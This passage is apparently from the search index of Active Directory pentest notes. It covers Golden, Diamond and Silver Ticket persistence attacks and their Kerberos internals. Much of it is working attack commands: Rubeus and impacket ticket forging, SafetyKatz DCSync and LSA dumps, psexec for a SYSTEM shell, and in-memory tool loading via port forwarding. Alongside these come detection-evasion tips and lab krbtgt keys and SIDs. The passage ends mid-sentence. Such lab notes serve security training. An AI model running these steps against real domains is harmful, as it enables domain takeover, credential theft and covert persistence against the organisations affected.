Required Value | Example | — | — | Domain | pirate.htb | Domain SID | S-1-5-21-1234-5678-9012 | User to impersonate | Administrator | RID | 500 | krbtgt hash | obtained above |"},{"id":"getting-domain-sid","u":"03_persistence.html#getting-domain-sid","sec":"Persistence","lvl":3,"t":"Getting Domain SID","c":"Using lookupsid impacket-lookupsid pirate.htb/administrator:'Password@123!'@DC01.pirate.htb Output: [*] Domain SID is: S-1-5-21-719815819-3726368948-3917688648 Save this."},{"id":"step-3-forge-golden-ticket-ticketer.py","u":"03_persistence.html#step-3-forge-golden-ticket-ticketer.py","sec":"Persistence","lvl":3,"t":"🧪 Step 3 — Forge Golden Ticket (ticketer.py)","c":"Now we generate the fake TGT . impacket-ticketer \\ -nthash 154cb6624b1d859f7080a6615adc488f \\ -domain-sid S-1-5-21-719815819-3726368948-3917688648 \\ -domain pirate.htb \\ -user-id 500 \\ Administrator"},{"id":"explanation-of-parameters","u":"03_persistence.html#explanation-of-parameters","sec":"Persistence","lvl":3,"t":"Explanation of Parameters","c":"Parameter | Meaning | — | — | ticketer.py | Impacket tool that creates forged Kerberos tickets | -nthash | NTLM hash of krbtgt account | -domain-sid | Domain SID used to build user SID | -domain | Target domain | -user-id | RID of impersonated user | Administrator | Username we are forging |"},{"id":"what-the-tool-does-internally","u":"03_persistence.html#what-the-tool-does-internally","sec":"Persistence","lvl":3,"t":"What the Tool Does Internally","c":"ticketer.py creates a fake TGT containing : User: Administrator SID: S-1-5-21-xxxx-xxxx-xxxx-500 Groups: Domain Admins Ticket lifetime Kerberos flags Then it signs the ticket using the krbtgt key . Because the DC trusts krbtgt , it accepts the ticket."},{"id":"output","u":"03_persistence.html#output","sec":"Persistence","lvl":3,"t":"Output","c":"[*] Saving ticket in Administrator.ccache The forged Golden Ticket is saved as: Administrator.ccache"},{"id":"step-4-load-the-golden-ticket","u":"03_persistence.html#step-4-load-the-golden-ticket","sec":"Persistence","lvl":3,"t":"🎟️ Step 4 — Load the Golden Ticket","c":"Set the Kerberos ticket environment variable. exportKRB5CCNAME=Administrator.ccache Verify ticket: klist Output: Ticket cache: FILE:Administrator.ccache Default principal: Administrator@PIRATE.HTB"},{"id":"step-5-use-the-ticket-to-access-domain-services","u":"03_persistence.html#step-5-use-the-ticket-to-access-domain-services","sec":"Persistence","lvl":3,"t":"🚀 Step 5 — Use the Ticket to Access Domain Services","c":"Now we can authenticate without a password . Example 1 — Access SMB impacket-smbclient-k-no-pass //DC01.pirate.htb/C$ Explanation: Flag | Meaning | — | — | -k | Use Kerberos | -no-pass | Do not request password | SMB path | Access admin share | Example 2 — Execute Commands on DC impacket-psexec-k-no-pass pirate.htb/Administrator@DC01.pirate.htb Result: C:\\Windows\\system32> You now have SYSTEM shell on the Domain Controller . Example 3 — Dump Domain Again impacket-secretsdump-k-no-pass pirate.htb/Administrator@DC01.pirate.htb Works because the ticket gives DA privileges ."},{"id":"why-golden-ticket-is-so-powerful","u":"03_persistence.html#why-golden-ticket-is-so-powerful","sec":"Persistence","lvl":3,"t":"⚠️ Why Golden Ticket Is So Powerful","c":"Golden Ticket allows: Capability | Reason | — | — | Login as any user | Ticket contains arbitrary username | Add admin privileges | Groups are embedded in ticket | Persistent access | Ticket lifetime can be years | Bypass password resets | Only krbtgt rotation invalidates |"},{"id":"ticket-lifetime","u":"03_persistence.html#ticket-lifetime","sec":"Persistence","lvl":3,"t":"Ticket Lifetime","c":"Bad attackers create 10 year tickets . Better approach: -end-time 8h Match environment Kerberos lifetime."},{"id":"avoid-using-administrator","u":"03_persistence.html#avoid-using-administrator","sec":"Persistence","lvl":3,"t":"Avoid Using Administrator","c":"Using Administrator triggers alerts because: LogonCount suddenly increases Better: Forge ticket for active admin user Example: svc_backup helpdesk_admin"},{"id":"the-critical-defense","u":"03_persistence.html#the-critical-defense","sec":"Persistence","lvl":3,"t":"🔥 The Critical Defense","c":"The ONLY way to invalidate Golden Tickets : Rotate krbtgt password twice Reason: AD stores two krbtgt hashes for ticket validation."},{"id":"key-insight-very-important","u":"03_persistence.html#key-insight-very-important","sec":"Persistence","lvl":3,"t":"⭐ Key Insight (Very Important)","c":"Golden Ticket works because: Service does NOT contact DC to validate TGT signature Instead: Service trusts krbtgt key used to sign ticket So if you know krbtgt key → you become the KDC ."},{"id":"windows-poc---example","u":"03_persistence.html#windows-poc---example","sec":"Persistence","lvl":3,"t":"Windows PoC - Example","c":"image.png In past videos we know svcadmin is the domain admin and we have the AES key of it. So, we will you this key to start a session of svcadmin using overpass the hash . Rubeus.exe asktgt /user:svcadmin /aes256 <aes_key> /opsec /createnetonly:C:\\Windows\\System32\\cmd.ece /show /ptt OR C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt image.png This will open a new cmd with elevated privileges of svcadmin. Next run dcsync attack, which will allow us request krbtgt hash: C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\" OR C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe - args \"lsadump::evasive-dcsync /user:dcorp\\krbtgt\" \"exit\" ----> prefered image.png image.png In output we got NTLM hash, AES 256 and 128 hash. For forging the golden ticket use AES256 key hash, because modern system uses AES256 keys Alternate method instead of dcsync: Transfer Loader.exe to the domain controller, being svcadmin - doman admin, it can copy files to the dc. Next connect to the DC using winrs: echo F| xcopy c:\\User\\Public\\Loader.exe \\\\dcorp-dc\\C$\\Users\\Public\\Loader.exe /Y winrs -r:dcorp-dc cmd image.png now create port forwarding for protecting from defender: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1 image.png next download and execute safetykatz in the memory: C:\\Users\\Public\\Loader.exe -path [http://127.0.0.1:8080/Safetykatz.exe](http://127.0.0.1:8080/Safetykatz.exe) -args \"lsadump::evasive-lsa\" \"exit\" image.png this will provide us with RC4(NTLM) keys of krbtgt account, inorder to get the AES key you have dcsync attack(which we performed above) image.png Next we will forge the golden ticket using option1 method: C:\\AD\\Tools\\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd Or C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd -------> prefered same command as above but in one line:- C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd image.png image.png the output of the previous command suggest the next command to use, make required adjustments to the command: C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:\"11/11/2022 6:34:22 AM\" /minpassage:1 /logoncount:153 /netbios:dcorp /groups:544,512,520 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt Same command but in one line:- C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:\"11/11/2022 6:34:22 AM\" /minpassage:1 /logoncount:153 /netbios:dcorp /groups:544,512,520 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt Above command will forge the golden ticket on behalf of Administrator and will import it in the current session image.png Now Accessing DC on behalf of Administrator image.png"},{"id":"diamond-ticket-attack","u":"03_persistence.html#diamond-ticket-attack","sec":"Persistence","lvl":2,"t":"Diamond Ticket Attack","c":""},{"id":"understanding-the-core-concept-1","u":"03_persistence.html#understanding-the-core-concept-1","sec":"Persistence","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-a-diamond-ticket-attack","u":"03_persistence.html#what-is-a-diamond-ticket-attack","sec":"Persistence","lvl":3,"t":"💎 What is a Diamond Ticket Attack?","c":"A Diamond Ticket is a Kerberos TGT modification attack . Unlike Golden Ticket (which creates a fake TGT from scratch), Diamond Ticket modifies a real TGT issued by the domain controller, then re-encrypts it using the krbtgt keys to make it stealthy and valid."},{"id":"difference-from-golden-ticket","u":"03_persistence.html#difference-from-golden-ticket","sec":"Persistence","lvl":3,"t":"🔹 Difference from Golden Ticket","c":"Golden Ticket = forging a brand-new TGT from scratch . Diamond Ticket = modifying an already valid TGT . Why is this important? Golden Ticket leaves no AS-REQ trail (no log showing the ticket was ever requested). Diamond Ticket has valid timestamps and log evidence (because the original TGT came from the DC). This makes Diamond Ticket more OPSEC safe (harder to detect). The Golden Ticket attack involves creating a completely new TGT (Ticket Granting Ticket) offline using the krbtgt account hash , without any interaction with the KDC . However, in certain environments, the KDC keeps track of AS-REQ (Authentication Service Request) logs and correlates issued TGTs with corresponding requests. Since a Golden Ticket never involves a real AS-REQ, the KDC has no record of issuing that TGT , which can potentially trigger detections or alerts. To overcome this limitation and improve stealth, attackers use the Diamond Ticket attack , where they start with a legitimate TGT issued by the KDC , then decrypt, modify, and re-encrypt it using the krbtgt key. This way, the ticket appears legitimate , matches the original AS-REQ record, and bypasses detections based on missing Kerberos ticket issuance logs."},{"id":"key-properties","u":"03_persistence.html#key-properties","sec":"Persistence","lvl":3,"t":"✅ Key Properties:","c":"Property | Description | — | — | 🔐 Attack Type | TGT modification , not creation | 🔑 Requires | krbtgt key (AES preferred), and valid TGT | 🕵️‍♂️ OPSEC | High stealth: ticket times & structure match legit ones | 🎫 TGT Status | Modified copy of a real TGT (not a forged one) | 🧪 Tool | Uses Rubeus.exe with /diamond option |"},{"id":"why-is-it-called-diamond-ticket","u":"03_persistence.html#why-is-it-called-diamond-ticket","sec":"Persistence","lvl":3,"t":"🔍 Why is it called “Diamond Ticket”?","c":"It’s sharper and stealthier than Golden Ticket. It’s a modified legit TGT , not a fabricated one. It appears 100% legitimate to the DC since it’s based on a valid ticket. Detection is very difficult since the ticket times, structure, and signatures are correct."},{"id":"persistence-1","u":"03_persistence.html#persistence-1","sec":"Persistence","lvl":3,"t":"🔹 Persistence","c":"Just like a Golden Ticket, the persistence lifetime of a Diamond Ticket depends on the krbtgt account password/keys . If the krbtgt key is rotated twice, both Golden and Diamond Tickets become invalid."},{"id":"why-its-stealthier-than-golden-ticket","u":"03_persistence.html#why-its-stealthier-than-golden-ticket","sec":"Persistence","lvl":3,"t":"Why It’s Stealthier Than Golden Ticket","c":"Factor | Golden Ticket | Diamond Ticket | — | — | — | AS-REQ | ❌ Forged from scratch (suspicious) | ✅ Legitimate (normal logon) | Log Entry 1 | Suspicious: User never logged in but has TGT | Normal: User legitimately requested TGT | Temporal Accuracy | ⚠️ Manually calculated (errors possible) | ✅ DC timestamps (always accurate) | PAC Structure | ⚠️ Forged PAC (structure might have errors) | ✅ Real PAC modified (structure perfect) | Session Key | Forged | Legitimate from DC | Detection Difficulty | Easier to detect TGT without proper auth | Harder—looks like normal login | ✅ Diamond is stealthier because: Legitimate initial TGT request logs normally No suspicious “user requested TGT with PA-PAC-REQUEST=false” Ticket times are always correct (no calculation errors) Event logs show normal user authentication"},{"id":"diagram-explanation","u":"03_persistence.html#diagram-explanation","sec":"Persistence","lvl":3,"t":"Diagram Explanation","c":""},{"id":"rubeus-command-structure","u":"03_persistence.html#rubeus-command-structure","sec":"Persistence","lvl":4,"t":"Rubeus Command Structure","c":"rubeus.exe diamond /tgtdeleg /ticketuser:DOMAIN\\Username /ticketuserid:1106 /groups:512 /krbkey:KRBTGT_KEY_HEX /outfile:ticket.kirbi"},{"id":"core-parameters-explained","u":"03_persistence.html#core-parameters-explained","sec":"Persistence","lvl":4,"t":"Core Parameters Explained","c":"Parameter | Purpose | Component Role | — | — | — | diamond | Selects the attack mode | Routing to Diamond ticket logic | /tgtdeleg | Request TGT via delegation | Legitimate TGT retrieval module | /ticketuser | Target user identity to forge | User spoofing component | /ticketuserid | RID of forged user | SID generator | /groups | Forged group memberships | PAC privilege escalation | /krbkey | KRBTGT master key (AES256) | Cryptographic signing engine | /outfile | Save forged ticket to disk | Serialization module |"},{"id":"internal-components-architecture","u":"03_persistence.html#internal-components-architecture","sec":"Persistence","lvl":4,"t":"Internal Components Architecture","c":"┌─────────────────────────────────────────────────────┐ │ RUBEUS DIAMOND TICKET ENGINE │ └─────────────────────────────────────────────────────┘ │ ┌─────────────────┼─────────────────┐ │ │ │ ┌───▼────┐ ┌───▼────┐ ┌───▼────┐ │ TGT │ │ TICKET │ │ PAC │ │RETRIEVAL │MODIFIER │SIGNER │ └────────┘ └────────┘ └────────┘ │ │ │ │ │ │ 1️⃣ LEGITIMATE 2️⃣ MODIFY 3️⃣ RE-SIGN AS-REQ/TGT PLAINTEXT WITH KRBTGT │ │ │ └─────────────────┼─────────────────┘ │ ┌────▼─────┐ │ ENCRYPT │ │ & EXPORT │ └───────────┘ │ ticket.kirbi"},{"id":"component-1-tgt-delegation-retrieval-tgtdeleg","u":"03_persistence.html#component-1-tgt-delegation-retrieval-tgtdeleg","sec":"Persistence","lvl":3,"t":"Component 1: TGT Delegation Retrieval ( /tgtdeleg )","c":"What It Does Requests a legitimate Ticket-Granting Ticket from the Domain Controller using the current user’s credentials. Internal Operations Step 1: AS-REQ Construction ├─ client_name = current_user ├─ realm = DOMAIN ├─ nonce = random_32bit └─ cname = client principal name Step 2: Cryptographic Binding ├─ Derive key from user password (PBKDF2) ├─ Create PA-ENC-TIMESTAMP │ └─ Timestamp encrypted with user's key └─ Sign request with user's credentials Step 3: DC Response (AS-REP) ├─ Receive encrypted TGT ├─ Decrypt using user's password-derived key └─ Extract plaintext TGT components"},{"id":"what-rubeus-extracts-from-tgt","u":"03_persistence.html#what-rubeus-extracts-from-tgt","sec":"Persistence","lvl":4,"t":"What Rubeus Extracts from TGT","c":"// From the encrypted TGT blob struct TicketData { int flags; // Renewable, forwarded, etc. string realm; // DOMAIN.COM string server_name; // krbtgt/DOMAIN.COM Timestamp auth_time; // When TGT was created Timestamp start_time; // Valid from Timestamp end_time; // Expires (typically 10 hours) Timestamp renew_till; // Can renew until Ticket ticket; // Encrypted AS-REP part EncryptedData enc_part; // Encrypted TGT contents }"},{"id":"component-2-ticket-modifier","u":"03_persistence.html#component-2-ticket-modifier","sec":"Persistence","lvl":3,"t":"Component 2: Ticket Modifier","c":"What It Modifies ┌──────────────────────────────────────┐ │ DECRYPT TGT (using KRBTGT key) │ └──────────────────────────────────────┘ │ ┌─────────────┼─────────────┐ │ │ │ ▼ ▼ ▼ PRINCIPAL GROUPS TIMESTAMPS NAMES (RIDs/SIDs) │ │ │ With /ticketuser:DOMAIN\\NewUser ├─ Replace cname (client name) ├─ Replace crealm (client realm) └─ Update name-type indicator With /groups:512 ├─ 512 = Domain Admins RID ├─ Insert SID: S-1-5-21-DOMAIN-512 └─ Update PAC_GROUPS_AND_RESOURCE_GROUPS With /krbkey:HEX_KEY ├─ Use for decryption operations └─ Use for re-signing operations Encrypted Part Decryption Encrypted TGT (from DC) │ ├─ Algorithm: AES256-CTS (RFC 3962) ├─ Key: KRBTGT master key (AES256 derived from password) └─ IV: First 16 bytes of encrypted blob │ ▼ EncKDCRepPart (plaintext) ├─ Key (session key for this TGT) ├─ Last-req ├─ Nonce (should match request nonce) ├─ Flags └─ **PAC (Privilege Attribute Certificate)**"},{"id":"component-3-pac-modifier-signer","u":"03_persistence.html#component-3-pac-modifier-signer","sec":"Persistence","lvl":3,"t":"Component 3: PAC Modifier & Signer","c":"This is the most critical component for the attack. PAC Structure PAC Buffer (within TGT) │ ├─ PAC_LOGON_INFO (0) │ ├─ User Name │ ├─ Domain Name │ ├─ User RID │ ├─ Primary Group RID │ ├─ Group Count │ └─ Group RIDs ◄─── MODIFIED HERE │ ├─ PAC_CREDENTIAL_INFO (1) │ └─ Encrypted with session key (not modified) │ ├─ PAC_SERVER_CHECKSUM (6) ◄─── RE-SIGNED HERE │ ├─ Algorithm: HmacSHA1 or HmacSHA256 │ ├─ Signed over: PAC_LOGON_INFO + other buffers │ └─ Key: KRBTGT key │ └─ PAC_PRIVSVR_CHECKSUM (7) ◄─── RE-SIGNED HERE ├─ Algorithm: HmacSHA1 or HmacSHA256 ├─ Signed over: All other buffers └─ Key: KRBTGT key Modification Workflow in Rubeus 1. DESERIALIZE (unmarshal ASN.1) ├─ Parse DER-encoded TGT structure └─ Convert to C# objects 2. DECRYPT enc_part (using KRBTGT key) ├─ Extract session key ├─ Extract PAC buffer array └─ Locate LogonInfo buffer 3. MODIFY LOGON_INFO ├─ Update user_name = /ticketuser value ├─ Update user_rid = /ticketuserid value ├─ Update GroupIds array │ └─ For each RID in /groups: │ ├─ Create SID: S-1-5-21-DOMAIN-RID │ └─ Append to GroupIds └─ Recalculate buffer offsets 4. RE-CALCULATE CHECKSUMS ├─ Server Checksum: │ └─ HMAC-SHA256(KRBTGT_key, PAC_LogonInfo) ├─ KDC Checksum: │ └─ HMAC-SHA256(KRBTGT_key, all_other_buffers) └─ Update checksum buffers in PAC 5. RE-ENCRYPT enc_part ├─ Encrypt modified EncKDCRepPart ├─ Algorithm: AES256-CTS └─ Key: KRBTGT key (again)"},{"id":"component-4-ticket-re-encryption-serialization","u":"03_persistence.html#component-4-ticket-re-encryption-serialization","sec":"Persistence","lvl":3,"t":"Component 4: Ticket Re-Encryption & Serialization","c":"Final Encryption Modified EncKDCRepPart (plaintext with new PAC) │ ├─ Cipher: AES256-CTS ├─ Key: KRBTGT key └─ Generate random IV │ ▼ Encrypted Blob │ ├─ Concatenate: IV + Ciphertext └─ Store in Ticket structure Ticket { tkt_vno = 5 (Kerberos version) realm = DOMAIN.COM sname = krbtgt/DOMAIN.COM enc_part { etype = 18 (AES256-CTS) cipher_text = [IV + encrypted_data] } }"},{"id":"kirbi-format-export","u":"03_persistence.html#kirbi-format-export","sec":"Persistence","lvl":4,"t":"Kirbi Format Export","c":"Rubeus exports as .kirbi (Rubeus native format) │ ├─ File Header: \"Kirbi\" magic bytes ├─ TGT Structure: Full Ticket + optional Service Ticket └─ Base64 encoding (optional, depending on flag) Alternative exports: ├─ /outfile:ticket.kirbi → Binary kirbi format ├─ /outfile:ticket.b64 → Base64-encoded kirbi └─ /copy → Load directly to memory"},{"id":"key-cryptographic-operations","u":"03_persistence.html#key-cryptographic-operations","sec":"Persistence","lvl":3,"t":"Key Cryptographic Operations","c":"1. Key Derivation (for understanding) KRBTGT_KEY (AES256) derivation: ┌─────────────────────────────────────────┐ │ Pbkdf2_HMAC_SHA1(password, salt, iterations) ├─ password = KRBTGT account password ├─ salt = DOMAIN.COMkrbtgt (realm + SPN) ├─ iterations = 4096 └─ output = 32 bytes (AES256 key) └─────────────────────────────────────────┘ 2. HMAC Checksum (critical for PAC) Server Checksum (protects PAC_LOGON_INFO): ───────────────────────────────────────── checksum = HMAC-SHA256( key = KRBTGT_KEY, message = PAC_LOGON_INFO buffer ) output = 32 bytes (SHA256 produces 32) KDC Checksum (protects everything else): ───────────────────────────────────────── checksum = HMAC-SHA256( key = KRBTGT_KEY, message = PAC_SERVER_CHECKSUM || PAC_CREDENTIAL_INFO || ... )"},{"id":"how-rubeus-handles-encryptiondecryption","u":"03_persistence.html#how-rubeus-handles-encryptiondecryption","sec":"Persistence","lvl":4,"t":"How Rubeus Handles Encryption/Decryption","c":"Rubeus uses Bouncy Castle cryptography library internally: // Simplified conceptual flow // 1. AES256-CTS Decryption var cipher = new CtsBlockCipher(new AesEngine()); cipher.Init(false, new KeyParameter(krbtgtKey)); // false = decrypt mode byte[] plaintext = new byte[ciphertext.Length]; cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plaintext, 0); // 2. HMAC-SHA256 Signing var hmac = new HMac(new Sha256Digest()); hmac.Init(new KeyParameter(krbtgtKey)); hmac.BlockUpdate(bufferToSign, 0, bufferToSign.Length); byte[] checksum = new byte[hmac.GetMacSize()]; hmac.DoFinal(checksum, 0);"},{"id":"data-flow-diagram","u":"03_persistence.html#data-flow-diagram","sec":"Persistence","lvl":4,"t":"Data Flow Diagram","c":"┌──────────────────────────┐ │ DC (Domain Controller) │ │ │ │ Receives: AS-REQ │◄──── Current user credentials │ Sends: AS-REP with TGT │ └──────────────┬───────────┘ │ │ Legitimate TGT │ (KRBTGT-encrypted) ▼ ┌──────────────────────────────────────┐ │ RUBEUS DIAMOND ENGINE │ │ │ │ 1. Decrypt with /krbkey │ │ └─ Gets plaintext TGT │ │ │ │ 2. Extract PAC from TGT │ │ └─ Gets logon info + checksums │ │ │ │ 3. Modify: │ │ ├─ User RID → /ticketuserid │ │ ├─ User name → /ticketuser │ │ └─ Groups → /groups parameters │ │ │ │ 4. Re-sign PAC: │ │ ├─ Server checksum (HMAC-SHA256) │ │ └─ KDC checksum (HMAC-SHA256) │ │ │ │ 5. Re-encrypt with KRBTGT key │ │ │ │ 6. Export to /outfile:ticket.kirbi │ └──────────────┬───────────────────────┘ │ │ Forged TGT │ (appears DC-signed) ▼ ┌──────────────────────────┐ │ Use with Kerberos tools │ │ (Pass-the-Ticket, etc.) │ └──────────────────────────┘"},{"id":"windows-example","u":"03_persistence.html#windows-example","sec":"Persistence","lvl":3,"t":"Windows Example","c":""},{"id":"step-by-step-diamond-ticket-attack","u":"03_persistence.html#step-by-step-diamond-ticket-attack","sec":"Persistence","lvl":3,"t":"🪜 Step-by-Step: Diamond Ticket Attack","c":"🧩 Step 1: Dump the krbtgt AES key If you have DA privileges or DCSync , use Mimikatz: lsadump::lsa /inject Look for: AES256_hmac : <long krbtgt AES key> 🧩 Step 2: Obtain a valid TGT Two ways to do it: Option A: Via /tgtdeleg (no password needed) If you’re running code as a domain user and delegation is enabled: Rubeus.exe tgtdeleg This extracts a valid TGT from memory of the current user session. Option B: With username & password Use credentials of a domain user to request a TGT: Rubeus.exe asktgt /user:studentx /password:StudentxPassword /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes /ptt 🧩 Step 3: Use Rubeus to modify the TGT → Diamond Ticket Two main ways: 1. Using credentials of a domain user Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt same command in one line: C:\\AD\\Tools\\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt /krbkey → krbtgt AES key /user + /password → valid domain user credentials /ticketuser:administrator → impersonate admin /groups:512 → add Domain Admins group /createnetonly → spawn a new process (cmd) with this ticket /ptt → pass-the-ticket (inject into current session) 2. Using delegated TGT ( /tgtdeleg ) Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt same command in one line: C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt Explanation: Parameter | Description | — | — | /krbkey | krbtgt AES256 or RC4 key | /tgtdeleg | lets Rubeus extract a valid TGT from memory (no creds needed if you already have user context). | /ticketuser | User you want to impersonate (e.g., administrator ) | /ticketuserid | RID of user ( 500 = built-in Administrator) | /groups | SID group list (512 = Domain Admins) | /createnetonly | Spawn a new process with only this ticket | /ptt | Pass-the-ticket (injects into memory) | image.png image.png 🧩 Step 4: Use the Diamond Ticket to Access Services After /ptt , your ticket is injected into memory. Now you can do: dir \\\\dcorp-dc.dollarcorp.moneycorp.local\\C$ Or open a privileged session: C:\\Windows\\System32\\cmd.exe You’ll have DA privileges under the impersonated user."},{"id":"sliver-ticket-attack","u":"03_persistence.html#sliver-ticket-attack","sec":"Persistence","lvl":2,"t":"Sliver Ticket Attack","c":""},{"id":"understanding-the-core-concept-2","u":"03_persistence.html#understanding-the-core-concept-2","sec":"Persistence","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-a-silver-ticket-attack","u":"03_persistence.html#what-is-a-silver-ticket-attack","sec":"Persistence","lvl":2,"t":"🚀 What is a Silver Ticket Attack?","c":"A Silver Ticket attack is a Kerberos-based attack where an attacker forges a service ticket (TGS) to access a specific service (like SQL, HTTP, CIFS, etc.) on behalf of a legitimate user — without needing to interact with the domain controller after forging the ticket. Unlike Golden Tickets, which give access to any service in the domain, Silver Tickets are scoped to a single SPN (service principal name) like CIFS/server , HTTP/server , etc. 👉 Golden ticket = forge TGT (Ticket Granting Ticket) → access to everything 👉 Silver ticket = forge TGS (service ticket) → access to specific service Because the ticket is presented directly to the service (not to the KDC), Domain Controllers never see the request → fewer logs and much stealthier."},{"id":"why-silver-ticket-attack-is-more-stealthier-than-golden-ticket-attack","u":"03_persistence.html#why-silver-ticket-attack-is-more-stealthier-than-golden-ticket-attack","sec":"Persistence","lvl":3,"t":"⚙️Why Silver Ticket Attack is more Stealthier than Golden Ticket Attack:","c":"Silver Ticket attacks are considered more stealthy than Golden Ticket attacks because Golden Tickets rely on the krbtgt account (which resides on the KDC and is heavily monitored by security solutions like Microsoft Defender for Identity -MDI), whereas Silver Tickets are forged using service account credentials and only interact directly with the target service, making them less likely to trigger high-fidelity alerts. You can forge a Silver Ticket for DC service accounts (like CIFS/DC01 , LDAP/DC01 , etc.), and it usually remains undetected by Microsoft Defender for Identity (MDI) because there’s no KDC involvement. That’s why Silver Tickets are considered more stealthy than Golden Tickets, even when targeting the DC itself."},{"id":"how-kerberos-works-simplified-flow","u":"03_persistence.html#how-kerberos-works-simplified-flow","sec":"Persistence","lvl":3,"t":"⚡ How Kerberos works (simplified flow)","c":"image.png 1️⃣ User authenticates and gets a TGT (Ticket Granting Ticket) from the KDC/Domain Controller (encrypted with KRBTGT account key). 2️⃣ User presents TGT to request a TGS (Service Ticket) from the KDC for the service (like CIFS/SQL). 3️⃣ User presents TGS to the service to access it."},{"id":"requirements-before-exploitation","u":"03_persistence.html#requirements-before-exploitation","sec":"Persistence","lvl":3,"t":"🧩 Requirements Before Exploitation","c":"✅ Domain SID (can be retrieved from any domain account using whoami /user ) ✅ Hostname and SPN of target service (e.g., MSSQLSvc/db1.dollarcorp.moneycorp.local) ✅ NTLM hash of the target service account ( db1$ ) ✅ Tool to forge and inject ticket (e.g., Rubeus, Mimikatz)"},{"id":"how-the-silver-ticket-attack-happens","u":"03_persistence.html#how-the-silver-ticket-attack-happens","sec":"Persistence","lvl":3,"t":"⚠ How the Silver Ticket attack happens","c":""},{"id":"key-idea","u":"03_persistence.html#key-idea","sec":"Persistence","lvl":3,"t":"📌 Key idea","c":"If an attacker compromises the password hash of a service account (e.g. the account under which SQL runs or HTTP runs), they can forge a valid service ticket (TGS) for that service. 👉 The TGS is encrypted/signed using the service account’s password hash (because that’s what the service can verify)."},{"id":"common-ways-attackers-obtain-the-service-key","u":"03_persistence.html#common-ways-attackers-obtain-the-service-key","sec":"Persistence","lvl":3,"t":"⚠ Common ways attackers obtain the service key","c":"Method 1 — LSASS dump Compromise a machine running the service. Then dump LSASS. Result: 🔑 Service account hash appears in memory. Example: SQL running as sqlsvc IIS running as websvc Computer account SERVER$ Method 2 — DCSync If attacker has replication rights: 🧠 Domain Controller ➡️ returns password hashes for any account So attacker can request: 🔑 DB1$ 🔑 SQLSVC 🔑 DC01$ Then forge tickets. Method 3 — Kerberoasting (what you suggested) Yes — this works too . Normal user can request: 🎟️ TGS for a service SPN Example: User requests: 🎫 TGS for MSSQLSvc/db1 KDC sends ticket encrypted with: 🔑 SQL service account key Attacker then: 🧨 extracts encrypted blob 🧨 cracks it offline If password is weak: 🔓 attacker gets service account hash Then attacker can forge Silver Ticket. So your idea is 100% valid ."},{"id":"steps","u":"03_persistence.html#steps","sec":"Persistence","lvl":3,"t":"📌 Steps","c":"✅ 1. Attacker compromises service account credentials (NTLM hash / password) For example: HTTP/srv-web.research.local or MSSQLSvc/sql.research.local ✅ 2. Attacker uses Mimikatz or similar tool to forge a TGS for that service They craft a ticket claiming any user identity (even admin) The ticket is encrypted with the 